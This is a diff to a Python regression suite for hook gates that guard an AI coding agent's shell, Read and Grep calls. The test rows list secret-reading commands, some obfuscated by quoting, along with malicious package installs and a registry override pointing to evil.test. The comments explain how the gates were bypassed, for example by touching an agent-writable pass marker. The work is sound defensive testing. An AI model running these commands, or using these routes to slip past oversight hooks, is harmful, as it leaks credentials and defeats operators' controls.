@@ -250,6 +250,48 @@ check("format-lint-gate (advisory) does not block with no parser", rc != 2,
       f"rc={rc}")
 
 
+print("\n== F5: a missing grep/tr must not turn a gate into a no-op ==")
+
+# [lens A F5] `cmd_has_verb`'s `grep -qE` sat inside an `if` condition and
+# `norm_cmd`'s `tr` inside a command substitution. Both contexts are exempt
+# from `set -e` and therefore from the ERR trap, so removing either binary
+# from PATH made every command gate return rc=0 with no message, no log line
+# and no hook_fail - a silent, total no-op in exactly the direction that
+# matters. This is the same class the secrets-gate header says was designed
+# out ("a pure-bash `shopt` cannot fail open that way"); the lesson had been
+# applied to the pattern matcher and not to the two shared helpers. The
+# helpers are pure bash now, so the gate's verdict cannot depend on PATH.
+for _missing in ("grep", "tr", "sed", "find"):
+    _d = os.path.join(TMP, "no-" + _missing)
+    shutil.rmtree(_d, ignore_errors=True)
+    shutil.copytree(_farm("full", ("python3", "jq")), _d, symlinks=True)
+    _p = os.path.join(_d, _missing)
+    if os.path.exists(_p):
+        os.remove(_p)
+    rc, _, _ = run("dependency-gate", pre("Bash", command="npm install evil"),
+                   path=_d)
+    check(f"dependency-gate still BLOCKS with {_missing} off PATH", rc == 2,
+          f"rc={rc} (0 = the gate silently became a no-op)")
+    rc, _, _ = run("secrets-gate", pre("Bash", command="cat .env"), path=_d)
+    check(f"secrets-gate still BLOCKS with {_missing} off PATH", rc == 2,
+          f"rc={rc}")
+
+
+print("\n== F10 / lens B 15: no spurious stderr on a fresh install ==")
+
+# `wc -c <"$LOG" 2>/dev/null` applies redirections left to right, so the
+# failing INPUT redirection reported before `2>/dev/null` took effect. A
+# fresh install has no .claude/logs/, so every hook attached a shell error
+# to its first decision.
+_fresh = os.path.join(TMP, "fresh-install")
+shutil.rmtree(_fresh, ignore_errors=True)
+os.makedirs(_fresh)
+for _hk in ("secrets-gate", "dependency-gate", "spec-gate-commit"):
+    rc, _, err = run(_hk, pre("Read", file_path="src/x.py"), project=_fresh)
+    check(f"{_hk} writes nothing to stderr on a clean first run",
+          err.strip() == "", repr(err[:200]))
+
+
 print("\n== P0-3c: environment failures must block, not degrade to exit 1 ==")
 
 # secrets-gate's mkdir -p of the log dir and its mktemp both died under
@@ -432,6 +474,43 @@ DEP = [
     ("npm run install-deps", 0),             # `run` is not an install verb
     ("pip install --upgrade gleeunit", 0),   # valueless flag, approved package
     ("git commit -m 'run npm install after pulling'", 0),
+    # -- v2.6.1: newly blocked, and newly allowed. The `2` rows below are
+    # additions to the cumulative set; the `0` rows are lens A F9's
+    # false-positive fixes and join the deliberate-relaxation list.
+    #
+    # [lens A F3 residue] Run-without-installing arrival channels. These
+    # were rc=0 at v2.5.0 AND v2.6.0 - not regressions, deliberate new
+    # coverage - so they are the one place this matrix's `2` set grows for
+    # a reason other than a regression.
+    ("npx evil-package", 2),
+    ("uvx evil", 2),
+    ("pnpm dlx evil", 2),
+    ("npm exec evil", 2),
+    ("bunx evil", 2),
+    ("yarn dlx evil", 2),
+    # An index override redirects an APPROVED package to another server, so
+    # no package-name check can see it.
+    ("PIP_INDEX_URL=http://evil.test/simple pip install gleeunit", 2),
+    ("NPM_CONFIG_REGISTRY=http://evil.test npm install gleeunit", 2),
+    # [lens A F9] The value of a value-taking flag is not a package name.
+    # Every one of these exited 2 at v2.6.0 AND named the wrong token in
+    # the reason string. They are the deliberate relaxations of this round.
+    ("pip install --index-url https://internal.example.com/simple gleeunit",
+     0),
+    ("pip install -i https://pypi.org/simple gleeunit", 0),
+    ("npm install --registry https://r.example.com gleeunit", 0),
+    ("pip install --no-binary :all: gleeunit", 0),
+    ("pip install --target ./libs gleeunit", 0),
+    # ...but the inversion that makes that safe: a flag consumes its value
+    # only when the value is value-SHAPED, so a short flag whose meaning
+    # differs by ecosystem can never swallow a package name.
+    ("npm install -f evil", 2),
+    ("npm install -d evil", 2),
+    ("pip install -t evil", 2),
+    # An approved package through a runner is still approved.
+    ("npx gleeunit", 0),
+    # Prose naming an index variable is not an override.
+    ('git commit -m "document PIP_INDEX_URL in the README"', 0),
 ]
 for cmd, want in DEP:
     rc, _, _ = run("dependency-gate", pre("Bash", command=cmd))
@@ -488,12 +567,98 @@ for path_, want in (("config.env", 2), ("prod.env", 2), ("staging.env", 2),
 
 print("\n== P0-2: the shell access route ==")
 
-for cmd, want in (("cat .env", 2), ("grep -r . secrets/", 2),
-                  ("cp id_rsa.key /tmp", 2),
-                  ("git diff -- '*.pem'", 2),
-                  ("ls -la", 0), ("echo hello", 0)):
+# INVARIANT, same shape as the dependency matrix above and for the same
+# reason. The v2.6.0 Bash tokenizer was `read -ra` plus a one-deep quote
+# strip, which was wrong in BOTH directions at once - it saw only the first
+# line (lens A F1, catastrophic under-match) and it treated every word of a
+# quoted argument as a path (lens B finding 4, the over-match that gets a
+# gate deleted). Fixing either alone yields a tokenizer that is confidently
+# wrong in the other direction, so both are pinned here together.
+#
+#   NO COMMAND THAT A PREVIOUS VERSION BLOCKED MAY NOW BE ALLOWED,
+#   except where the relaxation is deliberate and listed below.
+#
+# The `2` rows are cumulative and append-only. The `0` rows are the complete
+# list of deliberate relaxations - and in this gate there is exactly ONE
+# class of them (the dotenv TEMPLATE names), because relaxing a secrets
+# deny-list is the one direction that cannot be undone by an operator who
+# notices.
+SECRETS_BASH = [
+    # -- blocked at v2.6.0 and still blocked.
+    ("cat .env", 2), ("grep -r . secrets/", 2), ("cp id_rsa.key /tmp", 2),
+    ("git diff -- '*.pem'", 2), ("cat .env.production", 2),
+    ("base64 <.env", 2), ('cat ".env"', 2), ("cat $HOME/.env", 2),
+    ("cat ../proj/.env", 2), ("cat ./secrets/*", 2),
+    # -- [lens A F1] rc=0 at v2.6.0: `read` consumes ONE LINE, so every
+    # token after the first newline was invisible. Multi-line is the normal
+    # shape of an agent's Bash call, so this disabled the whole Bash surface
+    # in ordinary use - no attacker required.
+    ("cd /app\ncat .env", 2),
+    ("echo x\ncat secrets/prod.yaml", 2),
+    ("for f in *; do\n cat .env\ndone", 2),
+    ("\ncat .env", 2),
+    ("cat <<EOF\nx\nEOF\ncp deploy.pem /tmp/", 2),
+    # -- rc=0 at v2.6.0: the token kept the shell operator attached, so
+    # `.env;` matched no pattern. Found by executing this suite's own
+    # corpus, not by either lens.
+    ("cat .env; ls", 2),
+    ("cd secrets; cat prod.yaml", 2),
+    ("tar cf /tmp/s.tar secrets", 2),        # [lens A F6] bare directory
+    # -- [lens A F8] rc=0 at v2.6.0: intra-token quoting and backslash
+    # escapes did not survive a one-deep quote strip.
+    ("cat .en''v", 2),
+    ("cat .en\\v", 2),
+    ("cat 'sec'rets/prod.yaml", 2),
+    ("F=.env; cat $F", 2),
+    # -- allowed at v2.6.0 and still allowed.
+    ("ls -la", 0), ("echo hello", 0), ("ls src/my.envelope.gleam", 0),
+    ("git commit -m 'ordinary message'", 0),
+    # -- DELIBERATE RELAXATIONS, the complete list.
+    # [lens B finding 4] rc=2 at v2.6.0. Every word of a quoted argument
+    # became a candidate path, so a commit message mentioning .env blocked
+    # the commit. RETROFIT.md:1134 is the anchor: the mid-plan exception is
+    # for SECRETS, not for prose containing the substring.
+    ('git commit -m "fix the .env loader"', 0),
+    ('git commit -m "docs: describe secrets/README"', 0),
+    ('git commit -m "rotate the deploy.pem we ship"', 0),
+    # [lens B finding 4] rc=2 at v2.6.0 on BOTH surfaces. The dotenv
+    # TEMPLATE names are conventionally secret-free and committed to every
+    # repo that uses dotenv; blocking them blocks a file whose entire
+    # purpose is to be read. Exact basenames only.
+    ("cat .env.example", 0), ("cat .env.sample", 0), ("cat .env.template", 0),
+]
+for cmd, want in SECRETS_BASH:
     rc, _, _ = run("secrets-gate", pre("Bash", command=cmd))
     check(f"secrets-gate via Bash {cmd!r} -> {want}", rc == want, f"rc={rc}")
+
+# The same relaxation, and its limits, on the file surface.
+for path_, want in ((".env.example", 0), (".env.sample", 0),
+                    (".env.template", 0), (".env.dist", 0),
+                    ("config/.env.example", 0),
+                    # ...and nothing beyond it. A name that merely STARTS
+                    # like a template is still a dotenv file.
+                    (".env.example.real", 2), (".env.production", 2),
+                    (".env", 2), ("config.env", 2)):
+    rc, _, _ = run("secrets-gate", pre("Read", file_path=path_))
+    check(f"secrets-gate dotenv-template boundary {path_} -> {want}",
+          rc == want, f"rc={rc}")
+
+# [lens A F6] `secrets/**` normalizes to `secrets/*`, which the anchored
+# form matched only WITH the slash - and a Grep whose path is the directory
+# returns the matching file CONTENTS.
+for payload, want, label in (
+        ({"tool_name": "Grep", "tool_input": {"path": "secrets",
+                                              "pattern": "AWS_SECRET"}}, 2,
+         "Grep path=secrets (no slash)"),
+        ({"tool_name": "Grep", "tool_input": {"path": "secrets/"}}, 2,
+         "Grep path=secrets/ (control)"),
+        ({"tool_name": "Read", "tool_input": {"file_path": "not-secrets"}}, 0,
+         "not-secrets must not match the bare-dir form"),
+        ({"tool_name": "Read",
+          "tool_input": {"file_path": "docs/no-secrets/plan.md"}}, 0,
+         "no-secrets/ must still allow")):
+    rc, _, _ = run("secrets-gate", payload)
+    check(f"secrets-gate {label} -> {want}", rc == want, f"rc={rc}")
 
 # P2-4: NotebookEdit was matched but its path key was never read, so the gate
 # reported success while checking nothing.
@@ -505,44 +670,117 @@ rc, _, _ = run("secrets-gate", pre("Grep", path="secrets/"))
 check("secrets-gate guards Grep", rc == 2, f"rc={rc}")
 
 
-print("\n== P2-5: test-gate must not fail open forever ==")
+print("\n== P2-5 / F4 / lens B 3: test-gate ==")
 
-# `find src` was RELATIVE while the marker was absolute, so in a project with
-# no src/ the find failed silently and, once the marker existed, every commit
-# passed with no test run - forever.
+# [lens A F4] The pass marker is GONE. It was gitignored, agent-writable and
+# protected by no gate, so `touch .claude/.last-test-pass` disabled the gate
+# for the next commit - the P0-1 class (a gate trusting agent-writable
+# state) reached by a one-word command. "Verify the CONTENT instead" is not
+# a repair: whatever the gate can compute from the tree, an agent holding a
+# Write tool can compute and write too. The trusted input is gone instead,
+# so the gate runs the tests on every commit attempt.
 mark = os.path.join(PROJ, ".claude", ".last-test-pass")
 open(mark, "w").close()
 src_dir = os.path.join(PROJ, "src")
 os.makedirs(src_dir, exist_ok=True)
-import time
-time.sleep(0.01)
-with open(os.path.join(src_dir, "touched.py"), "w") as fh:
-    fh.write("x = 1\n")
 rc, _, err = run("test-gate", pre("Bash", command="git commit -m x"),
                  env={"PWD": TMP})
-check("test-gate re-runs tests after a source edit even from another cwd",
+check("test-gate runs the tests even with a touched marker present (F4)",
       "Running test gate" in err, err[:200])
-# test/ must invalidate the marker too - editing only tests used to be
-# invisible to the gate.
-open(mark, "w").close()
-tests_dir = os.path.join(PROJ, "tests")
-os.makedirs(tests_dir, exist_ok=True)
-time.sleep(0.01)
-with open(os.path.join(tests_dir, "t.py"), "w") as fh:
-    fh.write("x = 1\n")
+check("test-gate writes no marker for an agent to forge (F4)",
+      not os.path.exists(mark) or os.path.getsize(mark) == 0,
+      "a re-created marker is a re-created bypass")
+os.path.exists(mark) and os.remove(mark)
 rc, _, err = run("test-gate", pre("Bash", command="git commit -m x"))
-check("test-gate watches test/ as well as src/", "Running test gate" in err,
-      err[:200])
+check("test-gate still allows when the tests pass", rc == 0, f"rc={rc}")
+
+# [lens B finding 3] The rc dispatch was UNREACHABLE. `set +e` suppresses
+# exiting; it does NOT disarm an ERR trap, so the subshell's non-zero status
+# fired hook_fail before the if/elif/else ran and EVERY failing suite
+# reported "BLOCKED (fail-closed): unexpected hook error at line N". The
+# whole P2-5 fix (127 = toolchain missing vs. a real failure) was dead code,
+# and the seam-obliged reason string blamed the hook for a red suite. The
+# old parity test asserted the literal was PRESENT IN THE BODY - a byte
+# assertion standing in for a behavioural one - so it passed throughout.
+# These run the gate and read what it actually says.
+for test_cmd, needle, absent in (
+        ("exit 3", "tests failing (exit 3)", "unexpected hook error"),
+        ("sh -c 'echo boom; exit 5'", "tests failing (exit 5)",
+         "unexpected hook error"),
+        ("definitely-not-a-real-command", "test command not found (exit 127)",
+         "tests failing"),
+        ("", "test command not found (exit 127)", "tests failing")):
+    tg_proj = os.path.join(TMP, "tg" + str(abs(hash(test_cmd)) % 10000))
+    os.makedirs(tg_proj, exist_ok=True)
+    tg_cfg = os.path.join(TMP, "tg.yaml")
+    with open(tg_cfg, "w", encoding="utf-8") as fh:
+        fh.write(CONFIG.replace('test: "true"', f'test: "{test_cmd}"'))
+    subprocess.run([sys.executable, INSTALL, "-c", tg_cfg, "-C", tg_proj],
+                   capture_output=True, text=True)
+    e = dict(os.environ)
+    e["CLAUDE_PROJECT_DIR"] = tg_proj
+    p = subprocess.run([BASH, os.path.join(tg_proj, ".claude", "hooks",
+                                           "test-gate.sh")],
+                       input=json.dumps(pre("Bash", command="git commit -m x")),
+                       capture_output=True, text=True, env=e)
+    check(f"test-gate commands.test={test_cmd!r} blocks with a REAL reason",
+          p.returncode == 2 and needle in p.stderr and absent not in p.stderr,
+          f"rc={p.returncode} err={p.stderr.strip()[-200:]!r}")
 
 
 print("\n== P2-6: format-lint-gate must never mutate the tree ==")
 
-body = open(os.path.join(HOOKS, "format-lint-gate.sh"), encoding="utf-8"
-            ).read()
-code = "\n".join(ln for ln in body.splitlines()
-                 if not ln.lstrip().startswith("#"))
-check("the configured FORMAT command is not invoked (lint only)",
-      "true" in code or "lint" in code.lower(), code[-300:])
+# [lens B finding 11] THIS REPLACES A TEST THAT COULD NOT FAIL. What stood
+# here was:
+#
+#   check("the configured FORMAT command is not invoked (lint only)",
+#         "true" in code or "lint" in code.lower(), code[-300:])
+#
+# `code` is the comment-stripped format-lint-gate body, which always
+# contains `log "format-lint-gate ran (lint only; ...)"`. So
+# `"lint" in code.lower()` was unconditionally true - including if the
+# format command WERE invoked. The fixture made it worse: its commands.format
+# and commands.lint are both `"true"`, so even a correct substring check
+# could not tell the two apart.
+#
+# The assertion needs a fixture where the two commands are DISTINGUISHABLE,
+# so this installs one with sentinel commands and asserts the format
+# sentinel is absent from the emitted body while the lint sentinel is
+# present. That fails if P2-6 is ever reverted.
+FMT_PROJ = os.path.join(TMP, "fmt")
+os.makedirs(FMT_PROJ, exist_ok=True)
+fmt_cfg = os.path.join(TMP, "fmt.yaml")
+with open(fmt_cfg, "w", encoding="utf-8") as fh:
+    fh.write(CONFIG.replace('format: "true"',
+                            'format: "SENTINEL_FORMAT_CMD"')
+             .replace('lint: "true"', 'lint: "SENTINEL_LINT_CMD"'))
+subprocess.run([sys.executable, INSTALL, "-c", fmt_cfg, "-C", FMT_PROJ],
+               capture_output=True, text=True)
+fmt_body = open(os.path.join(FMT_PROJ, ".claude", "hooks",
+                             "format-lint-gate.sh"), encoding="utf-8").read()
+fmt_code = "\n".join(ln for ln in fmt_body.splitlines()
+                     if not ln.lstrip().startswith("#"))
+check("the configured FORMAT command is absent from the emitted body",
+      "SENTINEL_FORMAT_CMD" not in fmt_code, fmt_code[-400:])
+check("the configured LINT command IS in the emitted body (precondition)",
+      "SENTINEL_LINT_CMD" in fmt_code, fmt_code[-400:])
+# ...and behaviourally: a format command that would mutate never runs.
+touched = os.path.join(FMT_PROJ, "FORMATTER_RAN")
+mut_cfg = os.path.join(TMP, "fmt2.yaml")
+with open(mut_cfg, "w", encoding="utf-8") as fh:
+    fh.write(CONFIG.replace('format: "true"', f'format: "touch {touched}"'))
+MUT_PROJ = os.path.join(TMP, "fmt2")
+os.makedirs(MUT_PROJ, exist_ok=True)
+subprocess.run([sys.executable, INSTALL, "-c", mut_cfg, "-C", MUT_PROJ],
+               capture_output=True, text=True)
+e = dict(os.environ)
+e["CLAUDE_PROJECT_DIR"] = MUT_PROJ
+subprocess.run([BASH, os.path.join(MUT_PROJ, ".claude", "hooks",
+                                   "format-lint-gate.sh")],
+               input=json.dumps(pre("Write", file_path="src/x.rs")),
+               capture_output=True, text=True, env=e)
+check("a MUTATING format command is never executed by the hook",
+      not os.path.exists(touched), "the formatter ran behind the operator")
 
 
 print("\n== P2-7: drift counter is keyed on the payload session id ==")
